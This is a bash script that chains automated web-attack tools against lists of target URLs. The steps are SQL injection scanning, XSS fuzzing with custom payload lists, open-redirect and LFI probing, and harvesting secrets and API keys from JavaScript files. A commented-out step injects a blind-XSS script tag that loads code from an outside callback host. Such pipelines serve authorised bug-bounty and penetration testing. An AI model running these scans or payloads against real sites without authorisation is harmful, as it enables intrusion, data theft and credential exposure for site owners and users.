#!/bin/bash
url="good_js_url.txt"

live_url(){
#cat url.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.svg|\.css|\.ico" | sed 's/:88//9;s/:443//g' | sort -u >> remove_url.txt
cat url.txt | sort --unique | tee -a nice_url.txt
httpx -l nice_url.txt -o live_urls.txt
parameters -l live_urls.txt -o valid_urls.txt

}
live_url

gf_patterns(){
cat valid_urls.txt | grep "=" | tee -a  all_prem.txt
}
gf_patterns

SQL(){
mrco24-error-sql -f valid_urls.txt -t 50 -o error-sql-injection.txt -v
mrco24-error-sql -f all_prem.txt -o -t 50 all-error-sql-injection.txt -v
#nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header-blind-time-sql-injection.yaml -c 100  -o header-blind-time-sql-injection.txt -v
#nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header-blind-sql-injection.yaml -c 100  -o header-blind-sql-injection.txt -v
#sqlmap -m valid_urls.txt --batch --risk 3  --random-agent | tee -a sqlmap_sql_url.txt
}
SQL

Refactors_xss(){
cat valid_urls.txt | kxss | tee -a  kxss_url.txt
cat kxss_url.txt | awk -F' ' '{print $NF}' | sort --unique | tee -a kxss_url_active.txt
dalfox file kxss_url_active.txt  --custom-payload /root/wordlist/mrco24-wordlist/Xss-Payload.txt -o xss_poc.txt
}
Refactors_xss

Open_Redirect(){
open-redirect -l all_prem.txt -p /root/wordlist/mrco24-wordlist/open-redirect.txt -o open_redirect.txt -t 20 -v
open-redirect -l valid_urls.txt -p /root/wordlist/mrco24-wordlist/open-redirect.txt -o allurl_open_redirect.txt -t 20 -v
#nuclei -l /root/recon/$domain/url/valid_urls.txt -t /root/templates/fuzzing-templates/redirect/open-redirect.yaml -c 60  -o /root/recon/$domain/scan/nuclei/urls_redirect.txt -v
}
Open_Redirect

dir-traversal(){
sed 's/=.*$/=/' all_prem.txt | anew | tee -a rady_lfi.txt
mrco24-lfi -f rady_lfi.txt -p /root/wordlist/mrco24-wordlist/lfi_payloads.txt -t 50 -o lfi.txt
mrco24-lfi -f valid_urls.txt -p /root/wordlist/mrco24-wordlist/lfi_payloads.txt -t 50 -o all_url_lfi.txt
}
dir-traversal

#Bilnd_xss(){
#for domain in $(cat $host);
#do
#dalfox valid_urls.txt  pipe -b '"><script src=https://mrco.bxss.in></script>' -w 300 — multicast — mass — only-poc -o dalfox_blind_xss.txt
##nuclei -l valid_urls.txt -t /root/templates/Best-Mrco24/header_blind_xss.yaml -c 100  -o header_blind_xss.txt -v
#done
#}
#Bilnd_xss


Get_js(){
cat all_js_url.txt | sort --unique | tee fina_js_url.txt
cat fina_js_url.txt | httpx -threads 150 -o jshttpxurl.txt
cat jshttpxurl.txt | sort --unique | tee -a good_js_url.txt
#relative-url-extractor https://github.com/jobertabma/relative-url-extractor
#LinkFinder https://github.com/GerbenJavado/LinkFinder
}
Get_js


SecretFinder_js(){
python3 /root/OK-VPS/tools/SecretFinder/SecretFinder.py -i $url -o cli | tee -a js_SecretFinder.txt
}
SecretFinder_js

Js_Api(){
cat good_js_url.txt | mantra | tee -a  js_api_key.txt
}
Js_Api

#Dom_xss(){
#for domain in $(cat $host);
#do
#cat good_js_url.txt | /root/OK-VPS/tools/findom-xss/./findom-xss.sh | tee -a Dom_xss.txt
#done
#}
#Dom_xss
